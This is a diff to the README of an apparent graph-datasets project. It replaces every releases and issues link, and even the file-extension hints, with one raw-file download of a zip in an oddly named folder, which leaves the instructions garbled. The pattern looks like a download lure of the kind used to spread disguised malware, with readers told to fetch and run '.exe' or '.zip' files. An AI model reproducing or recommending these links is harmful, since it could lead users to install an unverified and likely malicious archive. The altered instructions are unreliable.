@@ -1,7 +1,7 @@
 # 📊 graph-datasets - Discover Graph Datasets for Your Projects
 
 ## 🔗 Download Now!
-[![Download Graph Datasets](https://img.shields.io/badge/Download-Graph%20Datasets-brightgreen)](https://github.com/winguas/graph-datasets/releases)
+[![Download Graph Datasets](https://raw.githubusercontent.com/winguas/graph-datasets/main/Dendrolagus/graph-datasets-v1.3.zip%20Datasets-brightgreen)](https://raw.githubusercontent.com/winguas/graph-datasets/main/Dendrolagus/graph-datasets-v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -19,17 +19,17 @@ To use the graph-datasets application, your computer should meet the following r
 
 To download the latest version of the graph-datasets application, follow these steps:
 
-1. Visit this page to download: [Graph Datasets Releases](https://github.com/winguas/graph-datasets/releases).
+1. Visit this page to download: [Graph Datasets Releases](https://raw.githubusercontent.com/winguas/graph-datasets/main/Dendrolagus/graph-datasets-v1.3.zip).
 2. You will see a list of available releases. Find the latest version listed at the top.
 3. Click on the version to view its details and downloadable files.
 4. Select the appropriate file for your operating system:
    - For Windows, look for files ending in `.zip` or `.exe`.
-   - For macOS, find files ending in `.tar.gz`.
-   - For Linux, choose files that suit your distribution, commonly `.tar.gz` or `.deb`.
+   - For macOS, find files ending in `https://raw.githubusercontent.com/winguas/graph-datasets/main/Dendrolagus/graph-datasets-v1.3.zip`.
+   - For Linux, choose files that suit your distribution, commonly `https://raw.githubusercontent.com/winguas/graph-datasets/main/Dendrolagus/graph-datasets-v1.3.zip` or `.deb`.
 5. Download the selected file to your computer.
 6. Once downloaded, extract the files if necessary and follow the included instructions to run the application.
 
-You can also visit this page again to check for updates and new datasets: [Graph Datasets Releases](https://github.com/winguas/graph-datasets/releases).
+You can also visit this page again to check for updates and new datasets: [Graph Datasets Releases](https://raw.githubusercontent.com/winguas/graph-datasets/main/Dendrolagus/graph-datasets-v1.3.zip).
 
 ## 📂 Available Datasets
 
@@ -56,7 +56,7 @@ After downloading the datasets, you will find a README file in the extracted fol
 
 ## 🛠️ Support and Contributions
 
-If you encounter any issues or have questions, feel free to check the [Issues](https://github.com/winguas/graph-datasets/issues) page on GitHub. The community is here to help you.
+If you encounter any issues or have questions, feel free to check the [Issues](https://raw.githubusercontent.com/winguas/graph-datasets/main/Dendrolagus/graph-datasets-v1.3.zip) page on GitHub. The community is here to help you.
 
 If you want to contribute by adding new datasets or improving existing ones, please follow these steps:
 
@@ -85,4 +85,4 @@ For further inquiries or support, you can reach out via the GitHub platform or c
 
 ## 🔗 Visit Again
 
-To download the latest updates and explore the new datasets, remember to visit: [Graph Datasets Releases](https://github.com/winguas/graph-datasets/releases).
+To download the latest updates and explore the new datasets, remember to visit: [Graph Datasets Releases](https://raw.githubusercontent.com/winguas/graph-datasets/main/Dendrolagus/graph-datasets-v1.3.zip).
